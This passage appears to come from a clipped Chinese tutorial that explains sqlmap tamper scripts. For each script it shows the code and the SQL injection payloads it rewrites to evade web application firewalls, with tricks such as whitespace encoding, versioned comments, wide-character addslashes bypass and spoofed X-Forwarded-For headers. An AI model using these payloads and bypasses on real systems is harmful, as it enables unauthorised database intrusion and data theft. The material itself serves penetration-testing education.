class="js-evernote-checked">适用数据库：</strong>MSSQL、MySQL</p><h4 data-evernote-id="342" class="js-evernote-checked">space2mysqlblank.py：</h4><blockquote data-evernote-id="343" class="js-evernote-checked"><p data-evernote-id="344" class="js-evernote-checked">blanks = ('%09', '%0A', '%0C', '%0D', '%0B')</p></blockquote><p data-evernote-id="345" class="js-evernote-checked">用这些随机空白符替换payload中的空格</p><blockquote data-evernote-id="346" class="js-evernote-checked"><p data-evernote-id="347" class="js-evernote-checked">union select 1,2--+	<strong data-evernote-id="348" class="js-evernote-checked">to</strong>	union%09select%0D1,2--+</p></blockquote><p data-evernote-id="349" class="js-evernote-checked"><strong data-evernote-id="350" class="js-evernote-checked">适用数据库：</strong>MySQL</p><h4 data-evernote-id="351" class="js-evernote-checked">space2mysqldash.py：</h4><p data-evernote-id="352" class="js-evernote-checked">用 -- 加一个换行符替换空格</p><blockquote data-evernote-id="353" class="js-evernote-checked"><p data-evernote-id="354" class="js-evernote-checked">union select 1,2--+	<strong data-evernote-id="355" class="js-evernote-checked">to</strong>	union--%0Aselect--%0A1,2--+</p></blockquote><p data-evernote-id="356" class="js-evernote-checked"><strong data-evernote-id="357" class="js-evernote-checked">适用数据库：</strong>MySQL、MSSQL</p><h4 data-evernote-id="358" class="js-evernote-checked">space2plus.py：</h4><p data-evernote-id="359" class="js-evernote-checked">用 + 替换空格</p><blockquote data-evernote-id="360" class="js-evernote-checked"><p data-evernote-id="361" class="js-evernote-checked">union select 1,2--+	<strong data-evernote-id="362" class="js-evernote-checked">to</strong>	union+select+1,2--+</p></blockquote><p data-evernote-id="363" class="js-evernote-checked"><strong data-evernote-id="364" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="365" class="js-evernote-checked">space2randomblank.py：</h4><blockquote data-evernote-id="366" class="js-evernote-checked"><p data-evernote-id="367" class="js-evernote-checked">blanks = ("%09", "%0A", "%0C", "%0D")</p></blockquote><p data-evernote-id="368" class="js-evernote-checked">用这些随机空白符替换 payload 中的空格</p><blockquote data-evernote-id="369" class="js-evernote-checked"><p data-evernote-id="370" class="js-evernote-checked">union select 1,2--+	<strong data-evernote-id="371" class="js-evernote-checked">to</strong>	union%09select%0C1,2--+</p></blockquote><p data-evernote-id="372" class="js-evernote-checked"><strong data-evernote-id="373" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="374" class="js-evernote-checked">symboliclogical.py：</h4><blockquote data-evernote-id="375" class="js-evernote-checked"><p data-evernote-id="376" class="js-evernote-checked">retVal = re.sub(r"(?i)\bAND\b", "%26%26", re.sub(r"(?i)\bOR\b", "%7C%7C", payload))</p></blockquote><p data-evernote-id="377" class="js-evernote-checked">用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p><blockquote data-evernote-id="378" class="js-evernote-checked"><p data-evernote-id="379" class="js-evernote-checked">1 and 1=1	<strong data-evernote-id="380" class="js-evernote-checked">to</strong>	1 %26%26 1=1</p></blockquote><blockquote data-evernote-id="381" class="js-evernote-checked"><p data-evernote-id="382" class="js-evernote-checked">1 or 1=1	<strong data-evernote-id="383" class="js-evernote-checked">to</strong>	1 %7c%7c 1=1</p></blockquote><p data-evernote-id="384" class="js-evernote-checked"><strong data-evernote-id="385" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="386" class="js-evernote-checked">unionalltounion.py：</h4><blockquote data-evernote-id="387" class="js-evernote-checked"><p data-evernote-id="388" class="js-evernote-checked">return payload.replace("UNION ALL SELECT", "UNION SELECT") if payload else payload</p></blockquote><p data-evernote-id="389" class="js-evernote-checked">用 union select 替换union all select</p><blockquote data-evernote-id="390" class="js-evernote-checked"><p data-evernote-id="391" class="js-evernote-checked">union all select 1,2--+	<strong data-evernote-id="392" class="js-evernote-checked">to</strong>	union select 1,2--+</p></blockquote><p data-evernote-id="393" class="js-evernote-checked"><strong data-evernote-id="394" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="395" class="js-evernote-checked">unmagicquotes.py：</h4><p data-evernote-id="396" class="js-evernote-checked">用宽字符绕过 GPC addslashes</p><blockquote data-evernote-id="397" class="js-evernote-checked"><p data-evernote-id="398" class="js-evernote-checked">1‘ and 1=1	<strong data-evernote-id="399" class="js-evernote-checked">to</strong>	1%df%27 and 1=1--</p></blockquote><p data-evernote-id="400" class="js-evernote-checked"><strong data-evernote-id="401" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="402" class="js-evernote-checked">uppercase.py：</h4><p data-evernote-id="403" class="js-evernote-checked">将 payload 大写</p><blockquote data-evernote-id="404" class="js-evernote-checked"><p data-evernote-id="405" class="js-evernote-checked">union select	<strong data-evernote-id="406" class="js-evernote-checked">to</strong>	UNION SELECT</p></blockquote><p data-evernote-id="407" class="js-evernote-checked"><strong data-evernote-id="408" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="409" class="js-evernote-checked">varnish.py：</h4><blockquote data-evernote-id="410" class="js-evernote-checked"><p data-evernote-id="411" class="js-evernote-checked">headers = kwargs.get("headers", {})headers["X-originating-IP"] = "127.0.0.1"return payload</p></blockquote><p data-evernote-id="412" class="js-evernote-checked">添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p><p data-evernote-id="413" class="js-evernote-checked">还可以自定义：</p><blockquote data-evernote-id="414" class="js-evernote-checked"><p data-evernote-id="415" class="js-evernote-checked">X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A</p></blockquote><p data-evernote-id="416" class="js-evernote-checked"><strong data-evernote-id="417" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="418" class="js-evernote-checked">versionedkeywords.py</h4><p data-evernote-id="419" class="js-evernote-checked">对不是函数的关键字进行注释</p><blockquote data-evernote-id="420" class="js-evernote-checked"><p data-evernote-id="421" class="js-evernote-checked">1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#	</p></blockquote><p data-evernote-id="422" class="js-evernote-checked"><strong data-evernote-id="423" class="js-evernote-checked">to</strong></p><blockquote data-evernote-id="424" class="js-evernote-checked"><p data-evernote-id="425" class="js-evernote-checked">1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</p></blockquote><p data-evernote-id="426" class="js-evernote-checked"><strong data-evernote-id="427" class="js-evernote-checked">适用数据库：</strong>MySQL</p><h4 data-evernote-id="428" class="js-evernote-checked">versionedmorekeywords.py：</h4><p data-evernote-id="429" class="js-evernote-checked">注释每个关键字</p><blockquote data-evernote-id="430" class="js-evernote-checked"><p data-evernote-id="431" class="js-evernote-checked">1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</p></blockquote><p data-evernote-id="432" class="js-evernote-checked"><strong data-evernote-id="433" class="js-evernote-checked">to</strong></p><blockquote data-evernote-id="434" class="js-evernote-checked"><p data-evernote-id="435" class="js-evernote-checked">1/<em data-evernote-id="436" class="js-evernote-checked">!UNION</em>//<em data-evernote-id="437" class="js-evernote-checked">!ALL</em>//<em data-evernote-id="438" class="js-evernote-checked">!SELECT</em>//<em data-evernote-id="439" class="js-evernote-checked">!NULL</em>/,/<em data-evernote-id="440" class="js-evernote-checked">!NULL</em>/,/<em data-evernote-id="441" class="js-evernote-checked">!CONCAT</em>/(/<em data-evernote-id="442" class="js-evernote-checked">!CHAR</em>/(58,122,114,115,58),/<em data-evernote-id="443" class="js-evernote-checked">!IFNULL</em>/(CAST(/<em data-evernote-id="444" class="js-evernote-checked">!CURRENT_USER</em>/()/<em data-evernote-id="445" class="js-evernote-checked">!AS</em>//<em data-evernote-id="446" class="js-evernote-checked">!CHAR</em>/),/<em data-evernote-id="447" class="js-evernote-checked">!CHAR</em>/(32)),/<em data-evernote-id="448" class="js-evernote-checked">!CHAR</em>/(58,115,114,121,58))#</p></blockquote><p data-evernote-id="449" class="js-evernote-checked"><strong data-evernote-id="450" class="js-evernote-checked">适用数据库：</strong>MySQL &gt;= 5.1.13</p><h4 data-evernote-id="451" class="js-evernote-checked">xforwardedfor.py：</h4><blockquote data-evernote-id="452" class="js-evernote-checked"><p data-evernote-id="453" class="js-evernote-checked">headers = kwargs.get("headers", {})headers["X-Forwarded-For"] = randomIP()return payload</p></blockquote><p data-evernote-id="454" class="js-evernote-checked">添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p><p data-evernote-id="455" class="js-evernote-checked"><strong data-evernote-id="456" class="js-evernote-checked">适用数据库：</strong>ALL</p><h3 data-evernote-id="457" class="js-evernote-checked">总结</h3><p data-evernote-id="458" class="js-evernote-checked">虽然 sqlmap 自带的 tamper 可以做很多事情，但是在实际的环境中，往往比较复杂，可能遇到的情况会非常多，这些 tamper 不可能做到很全面的应对各种环境，所以在学习自带的 tamper 的使用的同时，最好能够掌握 tamper 的编写规则，这样应对各种环境才能应对自如，不过作者也在准备这么一篇关于 tamper 的编写方式，希望可以帮到更多的同学，让我们在学习的路上不是孤军奋战。 </p><p data-evernote-id="459" class="js-evernote-checked"><strong data-evernote-id="460" class="js-evernote-checked">为了方便大家交流，有问题的可以加群与作者交流</strong></p><p data-evernote-id="461" class="js-evernote-checked"></p><div class="readableLargeImageContainer js-evernote-checked" data-evernote-id="462"><img src="./640" data-evernote-id="463" class="js-evernote-checked" width="544" height="290"></div><p data-evernote-id="464" class="js-evernote-checked"></p>
                </div></div></div><div id="footnotedLinks" class="separateSection js-evernote-checked" data-evernote-id="465"><div id="footnotedLinks__separator" class="separator js-evernote-checked" data-evernote-id="466"><div class="separatorLine setTextColorAsBackgroundColor js-evernote-checked" data-evernote-id="467"></div></div><ol id="footnotedLinks__list" data-evernote-id="468" class="js-evernote-checked"></ol></div><div id="measure__lineHeight" data-evernote-id="469" class="js-evernote-checked">Measure</div><div id="measure__fontSize" data-evernote-id="470" class="js-evernote-checked">Measure</div></div></div></div><div id="background" data-evernote-id="471" class="js-evernote-checked"></div></div><link rel="stylesheet" href="chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/reformat/css/style.css" type="text/css"><link rel="stylesheet" href="chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/reformat/css/additional.css"><div id="loading" data-evernote-id="472" class="js-evernote-checked"></div></body></html>